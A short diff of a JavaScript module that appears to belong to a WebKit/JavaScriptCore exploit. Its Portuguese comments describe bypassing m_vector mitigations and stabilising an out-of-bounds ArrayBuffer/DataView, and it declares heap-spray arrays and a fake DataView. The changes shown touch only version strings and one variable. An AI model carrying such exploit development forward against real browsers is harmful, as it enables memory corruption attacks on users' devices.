@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v16 - Fortificando Alocação OOB)
+// js/script3/testArrayBufferVictimCrash.mjs (v17 - Fortificando Alocacao OOB - Reforço no Teste)
 // =======================================================================================
 // ESTA VERSÃO TENTA BYPASSAR AS MITIGAÇÕES DO m_vector MANIPULANDO OFFSETS DE CONTROLE.
 // FOCO: Fortificar a estabilidade da alocação do ArrayBuffer/DataView usado para OOB.
@@ -22,7 +22,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v16 - Fortificando Alocacao OOB"; // Versão atualizada
+export const FNAME_MODULE = "v17 - Fortificando Alocacao OOB - Reforco no Teste"; // Versão atualizada
 
 // Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
 const LOCAL_VERY_SHORT_PAUSE = 10;
@@ -35,7 +35,6 @@ const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
 
 let global_spray_objects = [];
 let hold_objects = [];
-let oob_allocation_refs = []; // Nova variável para segurar referências a alocações OOB
 
 let _fake_data_view = null;
 
